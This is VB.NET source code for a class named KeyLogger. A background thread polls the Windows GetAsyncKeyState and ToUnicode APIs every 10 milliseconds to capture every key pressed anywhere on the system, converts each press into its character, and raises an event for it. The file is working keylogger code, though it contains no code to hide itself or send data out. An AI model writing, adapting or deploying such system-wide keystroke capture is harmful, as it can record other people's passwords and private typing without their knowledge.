Imports System.Runtime.InteropServices
Imports System.Text
Imports System.IO

Public Class KeyLogger
    Implements IDisposable
#Region "IDisposable Support"
    Private disposedValue As Boolean ' To detect redundant calls

    ' IDisposable
    Protected Overridable Sub Dispose(ByVal disposing As Boolean)
        If Not Me.disposedValue Then
            If disposing Then
                ' TODO: dispose managed state (managed objects).
            End If

            ' TODO: free unmanaged resources (unmanaged objects) and override Finalize() below.
            ' TODO: set large fields to null.
        End If
        Me.disposedValue = True
    End Sub

    ' TODO: override Finalize() only if D ispose(ByVal disposing As Boolean) above has code to free unmanaged resources.
    'Protected Overrides Sub Finalize()
    '    ' Do not change this code.  Put cleanup code in Dispose(ByVal disposing As Boolean) above.
    '    Dispose(False)
    '    MyBase.Finalize()
    'End Sub

    ' This code added by Visual Basic to correctly implement the disposable pattern.
    Public Sub Dispose() Implements IDisposable.Dispose
        ' Do not change this code.  Put cleanup code in Dispose(ByVal disposing As Boolean) above.
        Dispose(True)
        GC.SuppressFinalize(Me)
    End Sub
#End Region
    Public Const SleepTime As Integer = 10
    Public DownMap As New List(Of Keys)
    Public Event OnKeyPressed(ByVal key As Keys, ByVal Character As Char)
    Public Property _IsDisposed As Boolean
    Public Property _IsRunning As Boolean
    Public Thread As New Threading.Thread(AddressOf Work)
    Public Sub Start()
        _IsRunning = True
    End Sub
    Public Sub [Stop]()
        _IsRunning = False
    End Sub
    Private Sub Work()
        Do
            Dim KeyBoardState(256 - 1) As Byte
            Dim Buffer As New StringBuilder(256)
            If _IsDisposed Then
                Exit Do
            End If
            If _IsRunning Then
                For Each Key In KeysMap
                    Dim Contains As Boolean = DownMap.Contains(Key)
                    If GetAsyncKeyState(Key) <> 0 Then
                        If Not Contains Then
                            DownMap.Add(Key)
                            Dim IsShift As Boolean = DownMap.Contains(Keys.Shift) Or DownMap.Contains(Keys.LShiftKey) Or DownMap.Contains(Keys.RShiftKey)
                            Dim NumLock As Boolean = Control.IsKeyLocked(Keys.NumLock)
                            Dim CapsLock As Boolean = Control.IsKeyLocked(Keys.CapsLock)
                            Dim ScrollLock As Boolean = Control.IsKeyLocked(Keys.Scroll)
                            For i = 0 To 256 - 1
                                KeyBoardState(i) = 0
                            Next
                            Buffer.Clear()
                            If IsShift Then KeyBoardState(Keys.ShiftKey) = Byte.MaxValue
                            If NumLock Then KeyBoardState(Keys.NumLock) = Byte.MaxValue
                            If CapsLock Then KeyBoardState(Keys.CapsLock) = Byte.MaxValue
                            If ScrollLock Then KeyBoardState(Keys.Scroll) = Byte.MaxValue
                            Dim OutPut As Integer = ToUnicode(Key, 0, KeyBoardState, Buffer, 256, 0)
                            Dim Text As String = Buffer.ToString
                            If Text.Length <> 0 Then
                                RaiseEvent OnKeyPressed(Key, Text(0))
                            Else
                                RaiseEvent OnKeyPressed(Key, Chr(0))
                            End If
                        End If
                    Else
                        If Contains Then DownMap.Remove(Key)
                    End If
                Next
            End If
            Threading.Thread.Sleep(SleepTime)
        Loop
    End Sub
    <DllImport("user32.dll")>
    Public Shared Function GetAsyncKeyState(ByVal vKey As Keys) As Short
    End Function
    <DllImport("user32.dll")>
    Private Shared Function ToUnicode(ByVal VirtualKeyCode As UInteger, ByVal ScanCode As UInteger, ByVal KeyBoardState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr, sizeConst:=64)> ByVal recievingBuffer As StringBuilder, ByVal buffersize As Integer, ByVal flags As UInteger) As Integer
    End Function
    Public Sub _Dispose()
        _IsDisposed = True
    End Sub
    Sub New()
        Thread.Start()
    End Sub
    Public Shared Property KeysMap As Keys()
    Shared Sub New()
        KeysMap = [Enum].GetValues(GetType(Keys))
    End Sub
End Class